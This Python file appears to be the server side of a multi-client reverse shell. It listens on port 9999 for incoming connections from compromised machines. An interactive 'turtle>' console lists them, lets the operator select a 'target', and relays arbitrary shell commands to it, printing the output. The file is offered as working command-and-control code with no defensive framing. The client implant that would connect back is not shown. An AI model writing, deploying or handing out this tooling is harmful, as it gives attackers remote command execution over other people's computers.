import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_address = []

# s = socket.socket()
def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999

        s = socket.socket()

    except socket.error as e:
        print("Socket creation Error: " + e)

def bind_socket():
    try:
        global host
        global port
        global s

        print("binding port: " + str(port))
        print("waiting for connections..")

        s.bind((host, port))

        s.listen(5)

    except socket.error as e:
        print("Got an error, Retrying.." + e)

        bind_socket()

# Handelling connections from multiple clients and savign to a list.
# Closing previous connections when server.py file is restarted.
def accept_connections():
    for i in all_connections:
        i.close()
    
    del all_connections[:]
    del all_address[:]

    while True:
        try:
            conn, addr = s.accept()
            s.setblocking(1) # stops timeout from happening.
            all_connections.append(conn)
            all_address.append(addr)

            print("Connections established: " + addr[0])

        except socket.error as e:
            print("Got an error while connecting." + e)


# interactive shell to create a function to select and send cmd to a target conn.

def start_turtle():

    while True:
        cmd = input("turtle> ")
        if cmd == 'list':
            list_connections()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_cmd(conn)
        
        elif cmd == "exit":
            sys.exit()

        else:
            print("Command not recognised!")


def list_connections():
    results = ''

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(" "))
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_address[i]
            continue

        results += "\n" + str(i) + "  " + str(all_address[i][0]) + " : " + str(all_address[i][0])

    
    print("----ALL-CLIENTS----" + "\n" + results)


def get_target(cmd):

    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0]) + "> ", end="")
        return conn

    except:
        print("Selection not found!")


def send_target_cmd(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                # conn.close()
                # s.close()
                # sys.exit()
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_res = str(conn.recv(20480), "utf-8")
                print(client_res, end="")
        except:
            print("Error, command might not have sent!")
            break

# Create Threads for all the functions to work
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Do next job that is in the queue
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accept_connections()
        if x == 2:
            start_turtle()
            
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_workers()
create_jobs()